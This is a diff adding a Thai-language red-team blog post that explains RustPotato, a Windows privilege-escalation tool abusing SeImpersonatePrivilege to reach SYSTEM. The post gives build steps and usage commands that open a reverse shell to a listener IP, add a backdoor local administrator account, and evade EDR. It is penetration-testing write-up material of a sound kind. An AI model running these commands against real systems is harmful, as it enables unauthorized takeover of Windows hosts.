@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>🥔 RustPotato — Privilege Escalation via SeImpersonate | Sabastiaz</title>
+  <meta name="description" content="RustPotato — Privilege Escalation via SeImpersonate — Sabastiaz Red Team Sorcerer" />
+  <meta name="author" content="Ratthapong Sommanus (Sabastiaz)" />
+  <meta name="robots" content="index, follow" />
+  <meta name="theme-color" content="#1a1008" />
+  <meta property="og:title" content="RustPotato — Privilege Escalation via SeImpersonate | Sabastiaz" />
+  <meta property="og:description" content="RustPotato Rust implementation of GodPotato leveraging SeImpersonatePrivilege for SYSTEM escalation" />
+  <meta property="og:image" content="https://sabastiaz.github.io/pic/Untitled design.png" />
+  <link rel="stylesheet" href="../style.css" />
+  <link rel="icon" type="image/x-icon" href="../favicon.ico?v=3">
+  <link rel="icon" type="image/png" sizes="32x32" href="../favicon-32.png?v=3">
+  <link rel="icon" type="image/png" sizes="16x16" href="../favicon-16.png?v=3">
+  <style>
+    .post-back{display:inline-flex;align-items:center;gap:.4rem;font-family:'Cinzel',serif;font-size:.7rem;letter-spacing:.12em;color:var(--text-muted);text-decoration:none;margin-bottom:2rem;transition:color .2s}
+    .post-back:hover{color:var(--gold)}
+    .post-header{margin-bottom:3rem;padding-bottom:2rem;border-bottom:1px solid rgba(201,168,76,.15)}
+    .post-tags{display:flex;gap:.5rem;flex-wrap:wrap;margin-bottom:1rem}
+    .post-tag{font-family:'Cinzel',serif;font-size:.6rem;letter-spacing:.08em;padding:.15rem .5rem;border-radius:2px}
+    .tag-en    {color:#6bc5d2;background:rgba(107,197,210,.1);border:1px solid rgba(107,197,210,.22)}
+    .tag-th    {color:#c39bd3;background:rgba(195,155,211,.1);border:1px solid rgba(195,155,211,.22)}
+    .tag-cert  {color:var(--gold2);background:rgba(201,168,76,.1);border:1px solid rgba(201,168,76,.22)}
+    .tag-lab   {color:#5dba6a;background:rgba(93,186,106,.1);border:1px solid rgba(93,186,106,.22)}
+    .tag-pentest{color:#e07b5a;background:rgba(224,123,90,.1);border:1px solid rgba(224,123,90,.22)}
+    .tag-life  {color:#a89bc2;background:rgba(168,155,194,.1);border:1px solid rgba(168,155,194,.22)}
+    .tag-ctf   {color:#63d4af;background:rgba(99,212,175,.1);border:1px solid rgba(99,212,175,.22)}
+    .post-meta-row{display:flex;align-items:center;gap:1.2rem;margin-bottom:1.2rem;font-size:.78rem;color:var(--text-muted)}
+    .post-meta-row .dot{opacity:.3}
+    .post-title{font-family:'Cinzel',serif;font-size:clamp(1.3rem,4vw,2rem);font-weight:700;color:var(--text);line-height:1.35;margin:0}
+    .post-body{max-width:740px;line-height:1.9;color:var(--text-muted);font-size:.97rem}
+    .post-body h2{font-family:'Cinzel',serif;font-size:1.05rem;font-weight:600;color:var(--gold);margin:2.5rem 0 1rem;padding-bottom:.4rem;border-bottom:1px solid rgba(201,168,76,.15)}
+    .post-body h3{font-family:'Cinzel',serif;font-size:.88rem;font-weight:600;color:var(--text);margin:1.8rem 0 .8rem}
+    .post-body h4{font-family:'Cinzel',serif;font-size:.8rem;font-weight:600;color:var(--text-muted);margin:1.4rem 0 .6rem}
+    .post-body p{margin:0 0 1.2rem}
+    .post-body ul,.post-body ol{padding-left:1.5rem;margin:0 0 1.2rem}
+    .post-body li{margin-bottom:.4rem}
+    .post-body strong{color:var(--text)}
+    .post-body em{font-style:italic}
+    .post-body code{font-family:'Courier New',monospace;font-size:.84rem;background:rgba(201,168,76,.07);border:1px solid rgba(201,168,76,.15);padding:.1rem .35rem;border-radius:3px;color:var(--gold2)}
+    .post-body pre{background:rgba(0,0,0,.45);border:1px solid rgba(201,168,76,.15);border-radius:4px;padding:1.2rem 1.4rem;overflow-x:auto;margin:0 0 1.5rem}
+    .post-body pre code{background:none;border:none;padding:0;font-size:.82rem;color:#c9c9c9}
+    .post-body table{width:100%;border-collapse:collapse;margin:0 0 1.5rem;font-size:.88rem}
+    .post-body th{font-family:'Cinzel',serif;font-size:.68rem;letter-spacing:.08em;color:var(--gold);text-align:left;padding:.6rem 1rem;border-bottom:1px solid rgba(201,168,76,.25)}
+    .post-body td{padding:.5rem 1rem;border-bottom:1px solid rgba(201,168,76,.08)}
+    .post-body tr:nth-child(even) td{background:rgba(201,168,76,.02)}
+    .post-body blockquote{border-left:3px solid var(--gold);padding:.8rem 1.4rem;margin:0 0 1.5rem;background:rgba(201,168,76,.04);border-radius:0 4px 4px 0;font-style:italic}
+    .post-body a{color:var(--gold);text-decoration:none}
+    .post-body a:hover{text-decoration:underline}
+    .post-body figure{margin:1.5rem 0 2rem;text-align:center}
+    .post-body figure img{max-width:100%;border-radius:6px;border:1px solid rgba(201,168,76,.12)}
+    .post-body figcaption{font-size:.75rem;color:var(--text-muted);margin-top:.5rem;font-style:italic}
+    .post-body hr{border:none;border-top:1px solid rgba(201,168,76,.15);margin:2rem 0}
+    /* Source info box */
+    .source-box{background:rgba(201,168,76,.05);border:1px solid rgba(201,168,76,.2);border-radius:4px;padding:.9rem 1.2rem;margin:0 0 2rem;font-size:.82rem}
+    .source-box p{margin:0 0 .25rem}
+    .source-box p:last-child{margin:0}
+    .post-footer{margin-top:4rem;padding-top:2.5rem;border-top:1px solid rgba(201,168,76,.15);display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:1.5rem}
+    .author-card{display:flex;align-items:center;gap:1rem}
+    .author-avatar{width:48px;height:48px;border-radius:50%;object-fit:cover;border:2px solid rgba(201,168,76,.3)}
+    .author-name{font-family:'Cinzel',serif;font-size:.85rem;font-weight:600;color:var(--text)}
+    .author-creds{font-size:.7rem;color:var(--text-muted);margin-top:.2rem}
+  </style>
+</head>
+<body>
+<canvas id="stars-canvas"></canvas>
+<nav>
+  <a href="../index.html" class="nav-logo">Sabastiaz 🪄</a>
+  <ul class="nav-links">
+    <li><a href="../index.html">Home</a></li>
+    <li><a href="../about.html">About</a></li>
+    <li><a href="../skills.html">Spells</a></li>
+    <li><a href="../tools.html">Arsenal</a></li>
+    <li><a href="../writings.html" class="active">Tomes</a></li>
+    <li><a href="../honor.html">Honours</a></li>
+    <li><a href="../wowza.html">Wowza</a></li>
+    <li><a href="../event.html">Events</a></li>
+    <li><a href="../changelog.html">Updates</a></li>
+    <li><a href="../contact.html">Owl Post</a></li>
+    <li><a href="../cocacola.html">🥤</a></li>
+  </ul>
+  <button class="nav-hamburger" id="nav-hamburger" aria-label="Menu" aria-expanded="false"><span></span><span></span><span></span></button>
+</nav>
+
+<div class="page">
+  <div class="content">
+    <a href="../writings.html" class="post-back">← Back to Tomes</a>
+    <div class="post-header">
+      <div class="post-tags">
+        <span class="post-tag tag-th">TH</span>
+        <span class="post-tag tag-pentest">Red Team</span>
+        <span class="post-tag tag-lab">PrivEsc</span>
+      </div>
+      <div class="post-meta-row">
+        <span>May 13, 2026</span><span class="dot">✦</span><span>8 min read</span>
+      </div>
+      <h1 class="post-title">🥔 RustPotato — Privilege Escalation via SeImpersonate</h1>
+    </div>
+
+    <div class="post-body">
+
+      <div class="source-box">
+        <p><strong>Source:</strong> <a href="https://github.com/safedv/RustPotato" target="_blank" rel="noopener">github.com/safedv/RustPotato</a></p>
+        <p><strong>Base:</strong> GodPotato (BeichenDream) ported to Rust</p>
+        <p><strong>Target:</strong> Windows x86_64 → <code>NT AUTHORITY\SYSTEM</code></p>
+      </div>
+
+      <h2>Overview</h2>
+      <p>RustPotato เป็น Rust implementation ของ <strong>GodPotato</strong> ซึ่งเป็น Privilege Escalation tool ที่ใช้การ abuse DCOM และ RPC เพื่อ leverage <strong>SeImpersonatePrivilege</strong> และยกระดับสิทธิ์ขึ้นเป็น <code>NT AUTHORITY\SYSTEM</code> บน Windows</p>
+      <p><strong>จุดเด่นหลัก:</strong></p>
+      <ul>
+        <li>TCP-based Reverse Shell (รองรับทั้ง <code>cmd</code> และ <code>powershell</code>)</li>
+        <li>Indirect NTAPI Calls (หลีกเลี่ยง API hooking จาก EDR)</li>
+        <li>Cross-compile ได้จาก Linux (Kali) ไปเป็น Windows x86_64 binary</li>
+      </ul>
+
+      <h2>ความแตกต่างจาก GodPotato (Original)</h2>
+      <table>
+        <thead>
+          <tr><th>Feature</th><th>GodPotato (C#)</th><th>RustPotato (Rust)</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>ภาษา</td><td>C# / .NET</td><td>Rust</td></tr>
+          <tr><td>Runtime</td><td>.NET CLR Required</td><td>Native Binary (no runtime)</td></tr>
+          <tr><td>NTAPI</td><td>Direct API Calls</td><td><strong>Indirect NTAPI</strong> (stealthier)</td></tr>
+          <tr><td>Reverse Shell</td><td>ไม่มี built-in</td><td>มี TCP Reverse Shell built-in</td></tr>
+          <tr><td>AV Evasion</td><td>ต่ำกว่า</td><td>สูงกว่า (indirect syscalls)</td></tr>
+          <tr><td>Cross-compile</td><td>ไม่รองรับ</td><td>รองรับ (Linux → Windows)</td></tr>
+          <tr><td>Toolchain</td><td>.NET SDK</td><td>Rust Nightly</td></tr>
+        </tbody>
+      </table>
+
+      <h2>Execution Flow</h2>
+      <ol>
+        <li><strong>Locate RPC_SERVER_INTERFACE</strong> — สแกน memory ของ <code>combase.dll</code> หา RPC_SERVER_INTERFACE structure</li>
+        <li><strong>Hook RPC_DISPATCH_TABLE</strong> — แทรก custom function pointer เข้า dispatch table</li>
+        <li><strong>Create Named Pipe</strong> — สร้าง named pipe เช่น <code>\\.\pipe\RustPotato</code> พร้อม unrestricted access</li>
+        <li><strong>Unmarshal COM Object</strong> — บังคับให้ RPCSS เชื่อมต่อกับ named pipe</li>
+        <li><strong>Trigger RPCSS</strong> — ยิง RPC calls ผ่าน hooked dispatch table</li>
+        <li><strong>Impersonate Client</strong> — ใช้ <code>ImpersonateNamedPipeClient</code> เข้า security context ของ RPCSS</li>
+        <li><strong>Retrieve SYSTEM Token</strong> — ค้นหาและ duplicate token ของ <code>NT AUTHORITY\SYSTEM</code></li>
+        <li><strong>Execute Command</strong> — รัน command ด้วย <code>CreateProcessWithTokenW</code> ในฐานะ SYSTEM</li>
+        <li><strong>Restore &amp; Cleanup</strong> — คืน dispatch table และปิด named pipe server</li>
+      </ol>
+
+      <h2>การติดตั้ง (บน Kali Linux)</h2>
+
+      <h3>Prerequisites</h3>
+      <ul>
+        <li>Rust Nightly (version <strong>1.86</strong> ขึ้นไป)</li>
+        <li>Cross-compile toolchain สำหรับ <code>x86_64-pc-windows-gnu</code></li>
+      </ul>
+
+      <h3>Step 1 — ติดตั้ง Rust Nightly</h3>
+      <pre><code>curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
+rustup install nightly-2025-02-14</code></pre>
+
+      <h3>Step 2 — เพิ่ม Windows Target</h3>
+      <pre><code>rustup target add x86_64-pc-windows-gnu --toolchain nightly-2025-02-14</code></pre>
+
+      <h3>Step 3 — Clone Repository</h3>
+      <pre><code>git clone https://github.com/safedv/RustPotato
+cd RustPotato</code></pre>
+
+      <h3>Step 4 — Build</h3>
+      <pre><code># Clean build artifacts ก่อน (แนะนำ)
+rustup run nightly-2025-02-14 cargo clean
+
+# Build release binary
+rustup run nightly-2025-02-14 cargo build --release --target x86_64-pc-windows-gnu --features verbose</code></pre>
+      <p>Output binary อยู่ที่: <code>target/x86_64-pc-windows-gnu/release/RustPotato.exe</code></p>
+
+      <h2>การใช้งาน (Usage)</h2>
+
+      <h3>Syntax</h3>
+      <pre><code>RustPotato.exe [command line] | [options]</code></pre>
+
+      <h3>Options</h3>
+      <table>
+        <thead>
+          <tr><th>Option</th><th>Description</th></tr>
+        </thead>
+        <tbody>
+          <tr><td><code>[command line]</code></td><td>รัน command โดยตรงในฐานะ SYSTEM</td></tr>
+          <tr><td><code>-h &lt;LHOST&gt;</code></td><td>IP address ของ listener (reverse shell)</td></tr>
+          <tr><td><code>-p &lt;LPORT&gt;</code></td><td>Port ของ listener (reverse shell)</td></tr>
+          <tr><td><code>-c &lt;cmd|powershell&gt;</code></td><td>Shell type (default: <code>cmd</code>)</td></tr>
+        </tbody>
+      </table>
+
+      <h3>Examples</h3>
+      <pre><code># ตรวจสอบ privilege escalation
+RustPotato.exe "cmd.exe /c whoami"
+
+# เพิ่ม local admin user
+RustPotato.exe "cmd.exe /c net user hacker P@ssw0rd123 /add &amp;&amp; net localgroup administrators hacker /add"
+
+# Reverse shell ด้วย cmd (default)
+RustPotato.exe -h 192.168.1.100 -p 4444
+
+# Reverse shell ด้วย PowerShell
+RustPotato.exe -h 192.168.1.100 -p 4444 -c powershell</code></pre>
+
+      <h3>Listener Setup (Kali)</h3>
+      <pre><code>nc -lvnp 4444</code></pre>
+
+      <h2>ตัวอย่างการใช้งาน</h2>
+      <p>เริ่มจากเช็ค Privilege Name ว่ามี <code>SeImpersonatePrivilege</code> ไหม</p>
+      <figure>
+        <img src="../pic/rustpotato-1.png" alt="ตรวจสอบ SeImpersonatePrivilege" loading="lazy">
+      </figure>
+
+      <p>ใช้ Command ตาม Example เพื่อใช้ในการ Reverse Shell มันสะดวกกว่า GodPotato อีกนะเนี่ย</p>
+      <figure>
+        <img src="../pic/rustpotato-2.png" alt="รัน RustPotato reverse shell" loading="lazy">
+      </figure>
+
+      <p>เปิด <code>nc</code> รอเลย และก็รอรับ shell ได้ SYSTEM เรียบร้อย EZ</p>
+      <figure>
+        <img src="../pic/rustpotato-3.png" alt="ได้ SYSTEM shell" loading="lazy">
+      </figure>
+
+      <h2>Prerequisites บน Target (Windows)</h2>
+      <p>บัญชีที่มี <strong>SeImpersonatePrivilege</strong> เช่น:</p>
+      <ul>
+        <li><code>IIS AppPool</code></li>
+        <li><code>MSSQL Service Account</code></li>
+        <li><code>Network Service</code></li>
+        <li><code>Local Service</code></li>
+      </ul>
+      <p>Windows OS ที่รองรับ ไม่จำกัด version (ต่างจาก JuicyPotato)</p>
+
+      <p>ตรวจเช็คได้จาก Local Security Policy -> Users Rights Assignment -> Impersonate a client after authentication </p>
+      <figure>
+        <img src="../pic/rustpotato-4.png" alt="Prerequisites บน target" loading="lazy">
+      </figure>
+
+      <h2>ปัญหาที่พบระหว่างติดตั้ง</h2>
+
+      <h3>ปัญหา: ต้องใช้ Nightly Toolchain เฉพาะ version</h3>
+      <p><strong>อาการ:</strong> Build ล้มเหลวด้วย error เกี่ยวกับ feature flags หรือ unstable API<br>
+      <strong>สาเหตุ:</strong> RustPotato ใช้ Rust nightly features ที่ยังไม่ stable</p>
+      <pre><code>rustup install nightly-2025-02-14
+rustup run nightly-2025-02-14 cargo build ...</code></pre>
+
+      <h3>ปัญหา: ไม่มี linker สำหรับ x86_64-pc-windows-gnu</h3>
+      <p><strong>อาการ:</strong></p>
+      <pre><code>error: linker `x86_64-w64-mingw32-gcc` not found</code></pre>
+      <p><strong>แก้ไข (Kali/Debian):</strong></p>
+      <pre><code>sudo apt install gcc-mingw-w64-x86-64 -y</code></pre>
+
+      <h3>ปัญหา: Cargo build หา target ไม่เจอ</h3>
+      <p><strong>อาการ:</strong> <code>error[E0463]: can't find crate for 'std'</code><br>
+      <strong>สาเหตุ:</strong> ยังไม่ได้ add target สำหรับ toolchain นั้น</p>
+      <pre><code>rustup target add x86_64-pc-windows-gnu --toolchain nightly-2025-02-14</code></pre>
+
+      <h3>ปัญหา: Build ช้า / สะดุดครั้งแรก</h3>
+      <pre><code>rustup run nightly-2025-02-14 cargo clean
+rustup run nightly-2025-02-14 cargo build --release --target x86_64-pc-windows-gnu --features verbose</code></pre>
+
+      <h2>Dependencies ที่ compile ในขั้นตอน Build</h2>
+      <pre><code>proc-macro2, quote, unicode-ident
+windows-link, windows-result, windows-strings, windows-core v0.61.2
+winapi-x86_64-pc-windows-gnu v0.4.0, winapi v0.3.9
+libc v0.2.186, libc-print v0.1.23
+windows-threading, windows-interface, windows-implement
+windows-collections, windows-future, windows-numerics, windows v0.61.3
+base64 v0.22.1, syn v2.0.117, byteorder v1.5.0
+RustPotato v0.1.0</code></pre>
+
+      <h2>References</h2>
+      <ul>
+        <li><strong>RustPotato GitHub:</strong> <a href="https://github.com/safedv/RustPotato" target="_blank" rel="noopener">github.com/safedv/RustPotato</a></li>
+        <li><strong>GodPotato (Original):</strong> <a href="https://github.com/BeichenDream/GodPotato" target="_blank" rel="noopener">github.com/BeichenDream/GodPotato</a></li>
+        <li><strong>Rustic64Shell:</strong> TCP reverse shell base implementation ที่ RustPotato ใช้</li>
+      </ul>
+
+    </div>
+
+    <div class="post-footer">
+      <div class="author-card">
+        <img src="../pic/Untitled design.png" alt="Sabastiaz" class="author-avatar">
+        <div>
+          <div class="author-name">Sabastiaz</div>
+          <div class="author-creds">Red Team Sorcerer | OSEP | OSCP | CAPE | CPTS | CRTO | C-ADPenX | Tenable.VM Specialist | Tenable Guardian Thailand</div>
+        </div>
+      </div>
+      <a href="../writings.html" class="post-back">← Back to Tomes</a>
+    </div>
+  </div>
+</div>
+
+<script src="../stars.js"></script>
+<script src="../notif.js"></script>
+<script>
+  const ham = document.getElementById('nav-hamburger');
+  const ul  = document.querySelector('.nav-links');
+  if (ham) ham.addEventListener('click', () => {
+    const open = ham.getAttribute('aria-expanded') === 'true';
+    ham.setAttribute('aria-expanded', String(!open));
+    ul.classList.toggle('open', !open);
+  });
+</script>
+</body>
+</html>
